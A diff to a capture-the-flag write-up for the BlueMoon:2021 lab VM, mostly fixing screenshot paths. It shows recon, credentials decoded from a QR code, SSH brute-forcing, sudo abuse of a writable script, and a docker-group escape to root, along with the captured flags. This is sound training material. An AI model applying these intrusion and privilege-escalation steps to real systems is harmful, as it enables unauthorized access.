@@ -42,7 +42,7 @@ sudo netdiscover -r 192.168.56.0/24
 
 The target was identified as **192.168.56.101**.
 
-![Reconnaissance - netdiscover](screenshots/01-netdiscover.png)
+![Reconnaissance - netdiscover](01-netdiscover.png)
 
 ---
 
@@ -62,7 +62,7 @@ Three ports were open:
 | 22/tcp | SSH | OpenSSH 7.9p1 (Debian) |
 | 80/tcp | HTTP | Apache httpd 2.4.38 — page title `BlueMoon:2021` |
 
-![Scanning - nmap services](screenshots/02-nmap.png)
+![Scanning - nmap services](02-nmap.png)
 
 Directory brute-forcing on the web server revealed a hidden path.
 
@@ -74,7 +74,7 @@ gobuster dir -u http://192.168.56.101 \
 
 Result: `index.html`, `server-status` (403), and **`hidden_text`** (200).
 
-![Scanning - gobuster](screenshots/03-gobuster.png)
+![Scanning - gobuster](03-gobuster.png)
 
 ---
 
@@ -89,7 +89,7 @@ curl http://192.168.56.101/hidden_text
 wget http://192.168.56.101/.QR_C0d3.png
 ```
 
-![Gaining Access - hidden_text source](screenshots/04-hidden-text.png)
+![Gaining Access - hidden_text source](04-hidden-text.png)
 
 ### 3.2 Reading the QR code
 
@@ -106,7 +106,7 @@ USER=userftp
 PASSWORD=ftppassword
 ```
 
-![Gaining Access - QR decode](screenshots/05-qr-decode.png)
+![Gaining Access - QR decode](05-qr-decode.png)
 
 ### 3.3 FTP login
 
@@ -121,12 +121,12 @@ get p_lists.txt
 
 Two files were retrieved: `information.txt` and `p_lists.txt`.
 
-![Gaining Access - FTP login & files](screenshots/06-ftp.png)
+![Gaining Access - FTP login & files](06-ftp.png)
 
 - `information.txt` reveals the username **`robin`** and hints at a weak password.
 - `p_lists.txt` is a list of candidate passwords.
 
-![Gaining Access - file contents](screenshots/07-files.png)
+![Gaining Access - file contents](07-files.png)
 
 ### 3.4 Brute-forcing SSH
 
@@ -144,14 +144,17 @@ whoami    # robin
 id
 ```
 
-![Gaining Access - SSH as robin](screenshots/08-ssh-robin.png)
+![Gaining Access - SSH as robin](08-ssh-robin.png)
 
-**User-1 flag** was found in robin's home directory:
+**User-1 flag** was found in robin's home directory, and `sudo -l` revealed the next step.
 
 ```bash
 cat user1.txt
 # Fl4g{u5er1r34ch3d5ucc355fully}
+sudo -l
 ```
+
+![Gaining Access - user1 flag & sudo -l](08b-user1-sudo.png)
 
 ---
 
@@ -159,11 +162,7 @@ cat user1.txt
 
 ### 4.1 robin → jerry (sudo on a writable script)
 
-```bash
-sudo -l
-```
-
-Output showed robin may run a script as **jerry** without a password:
+`sudo -l` showed robin may run a script as **jerry** without a password:
 
 ```
 (jerry) NOPASSWD: /home/robin/project/feedback.sh
@@ -180,7 +179,7 @@ sudo -u jerry /home/robin/project/feedback.sh
 whoami    # jerry
 ```
 
-![PrivEsc - robin to jerry](screenshots/09-robin-to-jerry.png)
+![PrivEsc - robin to jerry](09-robin-to-jerry.png)
 
 **User-2 flag** was found in jerry's home directory:
 
@@ -188,6 +187,8 @@ whoami    # jerry
 cat /home/jerry/user2.txt
 # Fl4g{Y0ur34ch3du53r25uc355ful1y}
 ```
+
+![PrivEsc - user2 flag](09b-user2-flag.png)
 
 ### 4.2 jerry → root (docker group)
 
@@ -198,6 +199,8 @@ id    # ... groups=...,114(docker)
 docker images
 ```
 
+![PrivEsc - jerry docker group](10-jerry-to-root.png)
+
 A container was run with the host filesystem mounted, then `chroot` gave a root shell on the host.
 
 ```bash
@@ -207,9 +210,7 @@ cat /root/root.txt
 # Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
 ```
 
-![PrivEsc - jerry to root](screenshots/10-jerry-to-root.png)
-
-![Root flag](screenshots/11-root-flag.png)
+![Root flag](11-root-flag.png)
 
 ---
 
